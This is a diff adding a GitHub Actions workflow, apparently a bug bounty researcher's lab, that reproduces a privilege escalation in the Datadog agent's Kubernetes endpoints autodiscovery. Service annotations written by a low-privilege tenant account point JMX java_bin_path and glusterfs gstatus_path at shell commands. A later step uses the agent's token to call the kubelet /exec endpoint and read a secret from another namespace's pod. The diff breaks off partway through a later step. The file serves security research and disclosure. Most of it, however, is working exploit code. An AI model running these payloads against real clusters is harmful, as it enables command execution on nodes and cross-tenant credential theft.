@@ -1,0 +1,733 @@
+name: dd-endpoints-lab
+
+# Authorized self-owned lab (own US1 org Bugbounty-Whitfield).
+#
+# Tests a NEW autodiscovery provider on the banked untrusted-annotation ->
+# node-agent exec sink class: the Kubernetes endpoints / EndpointSlice
+# providers (`kube_endpoints` register name, user-facing
+# `kubernetes-endpoints` / `kubernetes-endpointslices`), which read
+# `ad.datadoghq.com/endpoints.*` from a Service and dispatch through the
+# `endpointschecks` provider to the node agent.
+#
+# No target infrastructure is contacted. Canary markers live inside the lab
+# agent container only.
+
+on:
+  workflow_dispatch:
+    inputs:
+      agent_tag:
+        description: Datadog agent/cluster-agent image tag
+        default: "7.85.4"
+        required: false
+      chart_version:
+        description: Datadog helm chart version
+        default: "3.269.1"
+        required: false
+
+permissions:
+  contents: read
+
+jobs:
+  lab:
+    runs-on: ubuntu-latest
+    timeout-minutes: 75
+    env:
+      LAB: ${{ github.workspace }}/lab
+      AGENT_TAG: ${{ inputs.agent_tag }}
+      CHART_VERSION: ${{ inputs.chart_version }}
+      WNODE: dd-endpoints-worker
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir -p "$LAB/evidence"
+
+      - name: Install kind, kubectl, helm
+        run: |
+          set -eu
+          curl -fsSLo kind https://kind.sigs.k8s.io/dl/v0.27.0/kind-linux-amd64 && chmod +x kind && sudo install -m0755 kind /usr/local/bin/kind
+          curl -fsSLo kubectl https://dl.k8s.io/release/v1.32.0/bin/linux/amd64/kubectl && chmod +x kubectl && sudo install -m0755 kubectl /usr/local/bin/kubectl
+          curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash >/dev/null
+          { kind version; kubectl version --client; helm version; } | tee "$LAB/evidence/00-tools.txt"
+
+      - name: Create 2-node kind cluster, namespaces, tenant workload, victim
+        run: |
+          set -eu
+          cat > kind.yaml <<'EOF'
+          kind: Cluster
+          apiVersion: kind.x-k8s.io/v1alpha4
+          nodes:
+          - role: control-plane
+            image: kindest/node:v1.32.0
+          - role: worker
+            image: kindest/node:v1.32.0
+          EOF
+          kind create cluster --name dd-endpoints --config kind.yaml --wait 240s
+          kubectl get nodes -o wide | tee "$LAB/evidence/00-nodes.txt"
+          kubectl create namespace tenant-a
+          kubectl create namespace customer
+          kubectl create namespace evidence
+
+          # Pre-existing tenant workload (created by the cluster admin, models the
+          # tenant's normal app). The attacker never creates a pod.
+          cat > app.yaml <<'EOF'
+          apiVersion: apps/v1
+          kind: Deployment
+          metadata:
+            name: app
+            namespace: tenant-a
+          spec:
+            replicas: 1
+            selector:
+              matchLabels:
+                app: nginx
+            template:
+              metadata:
+                labels:
+                  app: nginx
+              spec:
+                nodeSelector:
+                  kubernetes.io/hostname: dd-endpoints-worker
+                containers:
+                - name: app
+                  image: nginx:1.27-alpine
+                  ports:
+                  - containerPort: 80
+          EOF
+          kubectl apply -f app.yaml
+          kubectl -n tenant-a rollout status deploy/app --timeout=300s
+
+          # Cross-namespace victim: synthetic secret mounted in a pod the agent
+          # will exec into during the escalation leg.
+          kubectl -n customer create secret generic db-creds --from-literal=password='SYNTHETIC-LAB-VICTIM-SECRET'
+          cat > victim.yaml <<'EOF'
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: victim
+            namespace: customer
+          spec:
+            nodeSelector:
+              kubernetes.io/hostname: dd-endpoints-worker
+            containers:
+            - name: victim
+              image: alpine:3.20
+              command: ["/bin/sh","-c","sleep 7200"]
+              volumeMounts:
+              - name: creds
+                mountPath: /var/run/creds
+            volumes:
+            - name: creds
+              secret:
+                secretName: db-creds
+          EOF
+          kubectl apply -f victim.yaml
+          kubectl -n customer wait --for=condition=Ready pod/victim --timeout=240s
+          kubectl -n evidence run curl --image=curlimages/curl:8.10.1 --restart=Never --command -- sleep 7200
+          kubectl -n evidence wait --for=condition=Ready pod/curl --timeout=240s
+          kubectl -n tenant-a get pods -o wide | tee "$LAB/evidence/00-tenant-workload.txt"
+
+      - name: Endpoints-annotation author RBAC (services + endpointslices + endpoints, no pods/secrets)
+        run: |
+          set -eu
+          cat > author-rbac.yaml <<'EOF'
+          apiVersion: v1
+          kind: ServiceAccount
+          metadata:
+            name: ep-author
+            namespace: tenant-a
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: Role
+          metadata:
+            name: ep-author
+            namespace: tenant-a
+          rules:
+          - apiGroups: [""]
+            resources: ["services"]
+            verbs: ["create","patch","get"]
+          - apiGroups: ["discovery.k8s.io"]
+            resources: ["endpointslices"]
+            verbs: ["create","patch","get"]
+          - apiGroups: [""]
+            resources: ["endpoints"]
+            verbs: ["create","patch","get"]
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: RoleBinding
+          metadata:
+            name: ep-author
+            namespace: tenant-a
+          subjects:
+          - kind: ServiceAccount
+            name: ep-author
+            namespace: tenant-a
+          roleRef:
+            kind: Role
+            name: ep-author
+            apiGroup: rbac.authorization.k8s.io
+          EOF
+          kubectl apply -f author-rbac.yaml
+          {
+            echo "=== ep-author full permission list in tenant-a ==="
+            kubectl auth can-i --list -n tenant-a --as=system:serviceaccount:tenant-a:ep-author
+            echo
+            echo "=== point checks (tenant-a) ==="
+            for verb in create patch get list delete; do
+              for res in services endpoints endpointslices pods secrets configmaps deployments; do
+                printf '%-7s %-14s %s\n' "$verb" "$res" "$(kubectl auth can-i "$verb" "$res" -n tenant-a --as=system:serviceaccount:tenant-a:ep-author)"
+              done
+            done
+            echo
+            echo "=== point checks (customer namespace) ==="
+            for verb in create get list; do
+              for res in services pods secrets; do
+                printf '%-7s %-10s customer: %s\n' "$verb" "$res" "$(kubectl auth can-i "$verb" "$res" -n customer --as=system:serviceaccount:tenant-a:ep-author)"
+              done
+            done
+            echo
+            echo "=== datadog custom resources (installed by the chart check) ==="
+            for res in datadoginstrumentations datadogmetrics; do
+              printf 'create %-22s %s\n' "$res" "$(kubectl auth can-i create "$res" -n tenant-a --as=system:serviceaccount:tenant-a:ep-author 2>/dev/null || echo 'resource-not-installed')"
+            done
+            echo "create nodes: $(kubectl auth can-i create nodes --as=system:serviceaccount:tenant-a:ep-author)"
+            echo "get nodes/proxy: $(kubectl auth can-i get nodes/proxy --as=system:serviceaccount:tenant-a:ep-author)"
+          } | tee "$LAB/evidence/02-rbac.txt"
+
+      - name: Chart defaults - rendered provider wiring
+        run: |
+          set -eu
+          helm repo add datadog https://helm.datadoghq.com >/dev/null
+          helm repo update >/dev/null
+          helm show values datadog/datadog --version "$CHART_VERSION" > "$LAB/values-default.yaml"
+          {
+            echo "=== chart default values (relevant) ==="
+            grep -n -A3 "clusterChecks:" "$LAB/values-default.yaml" | head -12
+            grep -n "kubernetesUseEndpointSlices" "$LAB/values-default.yaml"
+            echo
+            echo "=== rendered DCA/agent env (default values) ==="
+          } | tee "$LAB/evidence/01-chart-defaults.txt"
+          cat > values-render.yaml <<'EOF'
+          datadog:
+            apiKey: "00000000000000000000000000000000"
+            appKey: "0000000000000000000000000000000000000000"
+            site: datadoghq.com
+            clusterName: dd-endpoints-lab
+            clusterChecks:
+              enabled: true
+          clusterAgent:
+            enabled: true
+          EOF
+          helm template dd-render datadog/datadog --version "$CHART_VERSION" -f values-render.yaml -n datadog > "$LAB/rendered-default.yaml"
+          {
+            echo "DCA:"
+            grep -n "DD_EXTRA_CONFIG_PROVIDERS\|DD_EXTRA_LISTENERS\|DD_KUBERNETES_USE_ENDPOINT_SLICES\|DD_CLUSTER_CHECKS_ENABLED" "$LAB/rendered-default.yaml" | head -12
+            echo
+            echo "gate var occurrences (expect none by default):"
+            grep -c "DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS" "$LAB/rendered-default.yaml" || true
+          } | tee -a "$LAB/evidence/01-chart-defaults.txt"
+
+      - name: Install Datadog chart (DCA control-plane, DaemonSet worker, 7.85.4)
+        env:
+          DD_API_KEY: ${{ secrets.DD_API_KEY }}
+          DD_APP_KEY: ${{ secrets.DD_APP_KEY }}
+        run: |
+          set -eu
+          umask 077
+          cat > values.yaml <<'EOF'
+          registry: registry.datadoghq.com
+          datadog:
+            apiKey: __DD_API_KEY__
+            appKey: __DD_APP_KEY__
+            site: datadoghq.com
+            clusterName: dd-endpoints-lab
+            logLevel: debug
+            kubelet:
+              tlsVerify: false
+            logs:
+              enabled: false
+            apm:
+              portEnabled: false
+            processAgent:
+              containerCollection: false
+              processCollection: false
+            orchestratorExplorer:
+              enabled: false
+            clusterChecks:
+              enabled: true
+          clusterAgent:
+            enabled: true
+            replicas: 1
+            image:
+              tag: __AGENT_TAG__
+            nodeSelector:
+              kubernetes.io/hostname: dd-endpoints-control-plane
+            tolerations:
+            - key: node-role.kubernetes.io/control-plane
+              operator: Exists
+              effect: NoSchedule
+          agents:
+            image:
+              tag: __AGENT_TAG__
+            nodeSelector:
+              kubernetes.io/hostname: dd-endpoints-worker
+            containers:
+              agent:
+                logLevel: debug
+          EOF
+          sed -i "s|__DD_API_KEY__|$DD_API_KEY|; s|__DD_APP_KEY__|$DD_APP_KEY|; s|__AGENT_TAG__|$AGENT_TAG|g" values.yaml
+          helm install datadog-agent datadog/datadog --version "$CHART_VERSION" -f values.yaml -n datadog --create-namespace --wait --timeout 14m || true
+          kubectl -n datadog get pods -o wide | tee "$LAB/evidence/01-pods.txt"
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=cluster-agent --timeout=360s
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=agent --timeout=360s
+
+      - name: Capability and configuration baseline
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          {
+            echo "DCA_POD=$DCA_POD"
+            echo "AGENT_POD=$AGENT_POD"
+            echo
+            echo "=== DCA env ==="
+            kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- sh -c 'printenv DD_CLUSTER_CHECKS_ENABLED DD_EXTRA_CONFIG_PROVIDERS DD_EXTRA_LISTENERS DD_KUBERNETES_USE_ENDPOINT_SLICES'
+            echo
+            echo "=== node agent env ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'printenv DD_CLUSTER_CHECKS_ENABLED DD_EXTRA_CONFIG_PROVIDERS DD_KUBERNETES_USE_ENDPOINT_SLICES DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS; echo "gate_end"'
+            echo
+            echo "=== node agent identity ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- id
+            echo "hostPID=$(kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.spec.hostPID}')"
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'grep -E " /host/| /etc/passwd " /proc/mounts | head -10'
+            echo
+            echo "=== java / jmxfetch presence (standard image) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /opt/datadog-agent/bin/agent/dist/jmx/jmxfetch.jar 2>&1; command -v java 2>&1; ls -l /bin/sh'
+            echo
+            echo "=== SA name and token presence in agent ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /var/run/secrets/kubernetes.io/serviceaccount/token; wc -c < /var/run/secrets/kubernetes.io/serviceaccount/token'
+          } | tee "$LAB/evidence/01-env.txt"
+
+      - name: T0 - benign endpoints-annotation lane (http_check) proves the channel
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          NODENAME=$(kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.spec.nodeName}')
+          cat > svc-http.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-http
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/endpoints.checks: |
+                {"http_check":{"instances":[{"name":"ep-canary","url":"http://%%host%%:80/","timeout":1}]}}
+          spec:
+            selector:
+              app: nginx
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-http.yaml --as=system:serviceaccount:tenant-a:ep-author
+          sleep 75
+          {
+            echo "=== Service and generated EndpointSlice ==="
+            kubectl -n tenant-a get svc ep-http -o yaml
+            kubectl -n tenant-a get endpointslice -l kubernetes.io/service-name=ep-http -o yaml
+            echo
+            echo "=== DCA endpointscheck configs (all) ==="
+            kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/endpointschecks/configs
+            echo
+            echo "=== DCA endpointscheck configs (node $NODENAME) ==="
+            kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" "https://datadog-cluster-agent.datadog.svc:5005/api/v1/endpointschecks/configs/$NODENAME"
+            echo
+            echo "=== DCA dispatch / provider log ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=6000 | grep -Ei "Dispatching configuration|ep-http|endpointslice|kube_endpoints|Cannot get Kubernetes" | tail -40
+            echo
+            echo "=== node agent http_check / provider log ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=8000 | grep -Ei "ep-canary|ep-http|endpointschecks|http_check" | tail -40
+            echo
+            echo "=== agent configcheck (endpoints lane) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'timeout 40 /opt/datadog-agent/bin/agent/agent configcheck 2>&1 | grep -E -A10 -B2 "ep-canary|ep-http|endpointschecks"' || true
+          } | tee "$LAB/evidence/10-t0-http.txt"
+
+      - name: T1 - JMX java_bin_path via endpoints annotation (default gate, fresh JMX runner)
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          NODENAME=$(kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.spec.nodeName}')
+          cat > svc-jmx.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-jmx
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/endpoints.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/ep-jmx-marker;hostname>>/tmp/ep-jmx-marker;cat</proc/1/comm>>/tmp/ep-jmx-marker;echo${IFS}ppid=$PPID>>/tmp/ep-jmx-marker"}]}}
+          spec:
+            selector:
+              app: nginx
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-jmx.yaml --as=system:serviceaccount:tenant-a:ep-author
+          echo "created ep-jmx as ep-author" | tee "$LAB/evidence/20-t1-jmx.txt"
+          sleep 120
+          {
+            echo "=== DCA endpointscheck configs (all) ==="
+            kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/endpointschecks/configs
+            echo
+            echo "=== DCA dispatch log (jmx) ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=8000 | grep -Ei "Dispatching configuration|jmx|ep-jmx" | tail -40
+            echo
+            echo "=== node agent JMX scheduler log ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=12000 | grep -Ei "Scheduling jmxfetch|Args:|jmx_|ep-jmx-marker|jmxfetch" | tail -60
+            echo
+            echo "=== marker in agent container ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l --time-style=full-iso /tmp/ep-jmx-marker 2>&1; echo "---content---"; cat /tmp/ep-jmx-marker 2>&1'
+          } | tee -a "$LAB/evidence/20-t1-jmx.txt"
+
+      - name: T2 - crafted EndpointSlice with no pod (services+endpointslices create only)
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          cat > svc-slice.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-slice
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/endpoints.checks: |
+                {"glusterfs":{"init_config":{"gstatus_path":"/bin/sh -c (id;hostname;echo${IFS}ppid=$PPID)>/tmp/ep-gluster-marker"},"instances":[{"use_sudo":false}]}}
+          spec:
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-slice.yaml --as=system:serviceaccount:tenant-a:ep-author
+          cat > slice.yaml <<'EOF'
+          apiVersion: discovery.k8s.io/v1
+          kind: EndpointSlice
+          metadata:
+            name: ep-slice-1
+            namespace: tenant-a
+            labels:
+              kubernetes.io/service-name: ep-slice
+          addressType: IPv4
+          endpoints:
+          - addresses:
+            - 10.244.99.99
+            conditions:
+              ready: true
+          ports:
+          - port: 80
+            protocol: TCP
+          EOF
+          kubectl create -f slice.yaml --as=system:serviceaccount:tenant-a:ep-author
+          echo "created ep-slice + crafted EndpointSlice (no targetRef, no pod)" | tee "$LAB/evidence/30-t2-slice.txt"
+          sleep 100
+          {
+            echo "=== objects ==="
+            kubectl -n tenant-a get svc ep-slice -o yaml
+            kubectl -n tenant-a get endpointslice ep-slice-1 -o yaml
+            echo "=== DCA endpointscheck configs ==="
+            kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/endpointschecks/configs
+            echo
+            echo "=== DCA clusterchecks state (is it a cluster check?) ==="
+            kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/clusterchecks | head -c 4000
+            echo
+            echo "=== DCA dispatch log (glusterfs / ep-slice) ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=8000 | grep -Ei "Dispatching configuration|glusterfs|ep-slice" | tail -40
+            echo
+            echo "=== node agent glusterfs execution log ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=12000 | grep -Ei "gstatus command|glusterfs|ep-gluster-marker" | tail -60
+            echo
+            echo "=== marker in agent container ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l --time-style=full-iso /tmp/ep-gluster-marker 2>&1; echo "---content---"; cat /tmp/ep-gluster-marker 2>&1'
+          } | tee -a "$LAB/evidence/30-t2-slice.txt"
+
+      - name: T3 - controls (wrong key, no endpoint, annotation removed, ignored object)
+        run: |
+          set -u
+          exec > >(tee "$LAB/evidence/40-t3-controls.txt") 2>&1
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+
+          echo "=== C1 wrong annotation key (endpoint.checks, missing s) ==="
+          cat > svc-typo.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-typo
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/endpoint.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/ep-typo-marker"}]}}
+          spec:
+            selector:
+              app: nginx
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-typo.yaml --as=system:serviceaccount:tenant-a:ep-author || true
+          sleep 45
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ep-typo-marker 2>&1' || true
+
+          echo
+          echo "=== C2 valid annotation but no EndpointSlice (selector matches nothing) ==="
+          cat > svc-noep.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-noep
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/endpoints.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/ep-noep-marker"}]}}
+          spec:
+            selector:
+              app: no-such-app
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-noep.yaml --as=system:serviceaccount:tenant-a:ep-author || true
+          sleep 45
+          kubectl -n tenant-a get endpointslice -l kubernetes.io/service-name=ep-noep -o name || true
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ep-noep-marker 2>&1' || true
+
+          echo
+          echo "=== C3 annotation removed by the attacker (patch, not delete) ==="
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'stat -c "%n %y" /tmp/ep-jmx-marker' || true
+          kubectl patch svc ep-jmx -n tenant-a --type=merge -p '{"metadata":{"annotations":{"ad.datadoghq.com/endpoints.checks":null}}}' --as=system:serviceaccount:tenant-a:ep-author
+          sleep 60
+          kubectl -n tenant-a get svc ep-jmx -o jsonpath='{.metadata.annotations}{"\n"}'
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'stat -c "%n %y" /tmp/ep-jmx-marker' || true
+
+          echo
+          echo "=== C4 annotation on an object the provider does not read (ConfigMap) ==="
+          kubectl -n tenant-a create configmap ep-cm --from-literal=x=1 --as=system:serviceaccount:tenant-a:ep-author 2>/dev/null || true
+          kubectl -n tenant-a annotate configmap ep-cm --overwrite 'ad.datadoghq.com/endpoints.checks={"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/ep-cm-marker"}]}}' 2>/dev/null || true
+          sleep 30
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ep-cm-marker 2>&1' || true
+
+          echo
+          echo "=== DCA log tail for the controls window ==="
+          kubectl -n datadog logs "$DCA_POD" -c cluster-agent --since=6m | grep -Ei "ep-typo|ep-noep|ep-jmx|ep-cm|Unschedule|Dispatching configuration" | tail -30
+
+      - name: T4 - escalation leg from the agent container (agent SA token -> kubelet /exec)
+        run: |
+          set -u
+          exec > >(tee "$LAB/evidence/50-t4-escalation.txt") 2>&1
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          SA=$(kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.spec.serviceAccountName}')
+          NODE_IP=$(kubectl get node "$WNODE" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')
+          echo "agent pod=$AGENT_POD sa=$SA node=$WNODE ip=$NODE_IP"
+          echo
+          echo "=== RBAC of the agent SA (authoritative) ==="
+          echo "get nodes/proxy: $(kubectl auth can-i get nodes/proxy --as=system:serviceaccount:datadog:$SA)"
+          echo "create pods/exec -n customer: $(kubectl auth can-i create pods/exec -n customer --as=system:serviceaccount:datadog:$SA)"
+          echo "get secrets -n customer: $(kubectl auth can-i get secrets -n customer --as=system:serviceaccount:datadog:$SA)"
+          echo
+          echo "=== kubelet /exec with the agent SA token (GET, SPDY upgrade) ==="
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c '
+            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+            curl -sk --http1.1 -m 12 -D /tmp/hdr.out -o /tmp/exec-raw.out -w "http_code=%{http_code}\n" \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Connection: Upgrade" -H "Upgrade: SPDY/3.1" \
+              -H "X-Stream-Protocol-Version: v4.channel.k8s.io" \
+              "https://'"$NODE_IP"':10250/exec/customer/victim/victim?command=%2Fbin%2Fsh&command=-c&command=id%3Bhostname%3Bcat%20%2Fvar%2Frun%2Fcreds%2Fpassword&error=1&output=1&tty=0"
+            echo "--- response headers ---"; cat /tmp/hdr.out
+            echo "--- raw body (printable) ---"; tr -cd "\11\12\15\40-\176" < /tmp/exec-raw.out | head -c 1200; echo
+          ' || true
+          echo
+          echo "=== control: same GET with no token ==="
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c '
+            curl -sk --http1.1 -m 8 -o /dev/null -w "http_code=%{http_code}\n" \
+              -H "Connection: Upgrade" -H "Upgrade: SPDY/3.1" \
+              -H "X-Stream-Protocol-Version: v4.channel.k8s.io" \
+              "https://'"$NODE_IP"':10250/exec/customer/victim/victim?command=%2Fbin%2Fsh&command=-c&command=id&error=1&output=1&tty=0"
+          ' || true
+          echo
+          echo "=== control: POST with the same token (expected denial) ==="
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c '
+            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+            curl -sk -m 8 -o /dev/null -w "http_code=%{http_code}\n" -X POST \
+              -H "Authorization: Bearer $TOKEN" \
+              "https://'"$NODE_IP"':10250/exec/customer/victim/victim?command=%2Fbin%2Fsh&command=-c&command=id&error=1&output=1&tty=0"
+          ' || true
+
+      - name: T5 - gate ON (integration_ignore_untrusted_file_params=true)
+        run: |
+          set -u
+          exec > >(tee "$LAB/evidence/60-t5-gateon.txt") 2>&1
+          DS=$(kubectl -n datadog get ds -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n datadog set env "ds/$DS" DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS=true
+          kubectl -n datadog rollout status "ds/$DS" --timeout=360s
+          sleep 20
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+
+          echo "=== gate value in the running agent ==="
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- printenv DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS
+          echo
+          echo "=== markers after restart (expect absent: new container) ==="
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ep-*-marker 2>&1' || true
+
+          echo
+          echo "=== JMX through the endpoints annotation WITH gate on ==="
+          cat > svc-jmx-gate.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-jmx-gate
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/endpoints.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/ep-jmx-gate-marker;hostname>>/tmp/ep-jmx-gate-marker;cat</proc/1/comm>>/tmp/ep-jmx-gate-marker"}]}}
+          spec:
+            selector:
+              app: nginx
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-jmx-gate.yaml --as=system:serviceaccount:tenant-a:ep-author || true
+          sleep 110
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l --time-style=full-iso /tmp/ep-jmx-gate-marker 2>&1; echo ---; cat /tmp/ep-jmx-gate-marker 2>&1' || true
+          echo
+          echo "=== node agent JMX scheduling with gate on ==="
+          kubectl -n datadog logs "$AGENT_POD" -c agent --tail=10000 | grep -Ei "Scheduling jmxfetch|Args:|ep-jmx-gate" | tail -30
+
+          echo
+          echo "=== glusterfs via the endpoints lane WITH gate on (ep-slice re-scheduled after restart) ==="
+          sleep 30
+          kubectl -n datadog logs "$AGENT_POD" -c agent --tail=14000 | grep -Ei "gstatus_path|not allowed from untrusted provider|SharedConfig|ep-gluster-marker" | tail -30
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ep-gluster-marker 2>&1' || true
+          echo
+          echo "=== DCA endpointscheck configs while gate on ==="
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/endpointschecks/configs | head -c 3000
+
+      - name: T6 - provider swap to classic kube_endpoints (kubernetesUseEndpointSlices=false)
+        run: |
+          set -u
+          exec > >(tee "$LAB/evidence/70-t6-classic.txt") 2>&1
+          kubectl -n tenant-a delete svc ep-jmx ep-jmx-gate --ignore-not-found
+          sleep 30
+          helm upgrade datadog-agent datadog/datadog --version "$CHART_VERSION" -f values.yaml -n datadog \
+            --set datadog.kubernetesUseEndpointSlices=false --timeout 14m || true
+          DS=$(kubectl -n datadog get ds -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n datadog rollout status "ds/$DS" --timeout=360s || true
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=cluster-agent --timeout=360s
+          sleep 25
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+
+          echo "=== provider selector env after swap (expect false) ==="
